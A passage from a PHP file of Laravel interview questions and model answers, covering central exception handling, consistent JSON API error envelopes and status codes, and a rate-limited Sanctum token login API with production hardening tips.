
Interview answer: "file for a single server, redis or database when load-balanced so every server sees the same session, plus short lifetimes and the ability to revoke sessions for sensitive apps."
TXT];

$q[] = ['question' => 'Q48. How does exception handling work in Laravel?', 'answer' => <<<'TXT'
Every uncaught exception goes to one central handler (app/Exceptions/Handler.php in Laravel 9/10, withExceptions() in bootstrap/app.php in 11+). It decides what to log (report) and what to return (render), so controllers do not need try/catch everywhere.

Custom domain exceptions make failures explicit:

```
class InsufficientBalanceException extends RuntimeException
{
    public function __construct(public readonly Account $account, public readonly Money $requested)
    {
        parent::__construct('Insufficient balance for this transfer.');
    }

    public function render(Request $request)     // Laravel calls this automatically
    {
        return response()->json(['success' => false, 'message' => $this->getMessage(), 'code' => 'INSUFFICIENT_BALANCE'], 422);
    }

    public function report(): bool               // expected business case: do not alert on-call
    {
        return false;
    }
}

// Service
if ($from->balance->lt($amount)) throw new InsufficientBalanceException($from, $amount);
```

Central rules (Laravel 9/10 Handler::register):

```
$this->renderable(function (ModelNotFoundException $e, Request $request) {
    if ($request->expectsJson()) return response()->json(['success' => false, 'message' => 'Not found.'], 404);
});

$this->reportable(function (PaymentGatewayException $e) {
    Log::channel('payments')->error($e->getMessage(), ['order' => $e->orderId]);
});
```

When to catch locally: only when you can do something useful, such as retrying, falling back, or converting a third-party error into a domain exception.

```
try {
    $charge = $gateway->charge($order);
} catch (ConnectionException $e) {
    throw new PaymentGatewayUnavailableException(previous: $e);   // keep the original as context
}
```

Production rules: APP_DEBUG=false so users never see stack traces, SQL, file paths or secrets; log with context (user id, order id, request id); send errors to a tracker (Sentry, Bugsnag); return a reference id the customer can quote to support.

Interview answer: "One central handler reports and renders exceptions. I use domain exceptions with render/report methods, catch locally only to recover or translate, keep debug off in production and log with context."
TXT];

$q[] = ['question' => 'Q49. How do you return API errors consistently?', 'answer' => <<<'TXT'
Clients (mobile apps, partners) should be able to handle every endpoint the same way. Pick one envelope and one set of status codes.

```
Success                                  Failure
{                                        {
  "success": true,                         "success": false,
  "message": "Order created",              "message": "Validation failed",
  "data": { "id": 187, "status": "placed" }, "code": "VALIDATION_FAILED",
  "meta": { "request_id": "c1f..." }       "errors": { "email": ["The email field is required."] }
}                                        }
```

Status codes that must match the body:

```
200 OK            read or update succeeded
201 Created       POST created a resource (with Location header)
204 No Content    delete succeeded, no body
400 Bad Request   malformed request
401 Unauthorized  not authenticated
403 Forbidden     authenticated, not allowed
404 Not Found     resource missing or hidden
409 Conflict      duplicate or state conflict (order already paid)
422 Unprocessable validation failed
429 Too Many      rate limited (with Retry-After)
500 Server Error  unexpected failure; generic message only
503 Unavailable   maintenance or upstream gateway down
```

Implementation: one place builds responses, and the exception handler converts all exceptions to the same shape.

```
trait ApiResponses
{
    protected function ok($data, string $message = 'OK', int $status = 200)
    {
        return response()->json(['success' => true, 'message' => $message, 'data' => $data], $status);
    }
}

// Handler: validation, auth, not found, throttle, everything else
$this->renderable(fn (ValidationException $e, $r) => $r->expectsJson()
    ? response()->json(['success' => false, 'message' => 'Validation failed', 'code' => 'VALIDATION_FAILED', 'errors' => $e->errors()], 422) : null);
$this->renderable(fn (Throwable $e, $r) => $r->is('api/*') && ! config('app.debug')
    ? response()->json(['success' => false, 'message' => 'Something went wrong', 'code' => 'SERVER_ERROR'], 500) : null);
```

Use API Resources (php artisan make:resource OrderResource) so field names and formats are stable even when the database changes.

Payment API tip: include a machine-readable code (CARD_DECLINED, INSUFFICIENT_FUNDS, GATEWAY_TIMEOUT). Apps branch on codes, not on English messages that may be translated or reworded.

Interview answer: "One JSON envelope, correct status codes, stable error codes, API Resources for data, and the exception handler converting every error so no endpoint invents its own format."
TXT];

$q[] = ['question' => 'Q50. Design a secure Laravel login API.', 'answer' => <<<'TXT'
Goal: POST /api/login returns a token for a mobile or SPA client, resists brute force and does not leak which emails exist.

Step 1, validation and rate limiting:

```
// RouteServiceProvider / bootstrap: 5 attempts per minute per email+IP
RateLimiter::for('login', fn (Request $r) => Limit::perMinute(5)->by(Str::lower($r->input('email')) . '|' . $r->ip()));

Route::post('/login', LoginController::class)->middleware('throttle:login');

$data = $request->validate(['email' => ['required', 'email'], 'password' => ['required', 'string'], 'device_name' => ['required', 'string', 'max:100']]);
```

Step 2, verify the password with the hash (bcrypt/argon2), and give the same error for a wrong email or a wrong password:

```
$user = User::where('email', Str::lower($data['email']))->first();

if (! $user || ! Hash::check($data['password'], $user->password)) {
    throw ValidationException::withMessages(['email' => 'These credentials do not match our records.']);
}

if (! $user->is_active) abort(403, 'This account is disabled.');
```

Step 3, issue a token with limited abilities and an expiry (Sanctum):

```
$token = $user->createToken($data['device_name'], ['orders:read', 'orders:write'], now()->addDays(30))->plainTextToken;

return response()->json(['success' => true, 'token' => $token, 'token_type' => 'Bearer',
    'user' => new UserResource($user)]);
```

Sanctum stores only a hash of the token, so a database leak does not expose usable tokens.

Step 4, protect routes and check abilities:

```
Route::middleware('auth:sanctum')->group(function () {
    Route::get('/profile', ProfileController::class);
    Route::post('/orders', StoreOrderController::class)->middleware('ability:orders:write');
    Route::post('/logout', fn (Request $r) => tap(response()->noContent(), fn () => $r->user()->currentAccessToken()->delete()));
});
```

Step 5, production hardening:
- HTTPS only; never log passwords or tokens (redact them in logging).
- Rehash passwords when the hashing cost increases (Hash::needsRehash).
- Two-factor or OTP for sensitive apps; for banking, require step-up OTP again for transfers even with a valid token.
- Lock or slow down accounts after repeated failures and notify the user of new device logins.
- Revoke all tokens on password change: $user->tokens()->delete().
- Store tokens on mobile in secure storage (Keychain/Keystore), not plain preferences.

Flow:

```
Client -> POST /api/login (throttled) -> validate -> Hash::check -> createToken(abilities, expiry)
Client -> Authorization: Bearer <token> -> auth:sanctum -> ability check -> policy -> controller
```

Interview answer: "Validate and throttle, verify hashed passwords with a generic error, issue scoped expiring Sanctum tokens, protect routes with auth:sanctum and abilities, revoke tokens on logout and password change, and add OTP for high-risk actions."
TXT];

return $q;
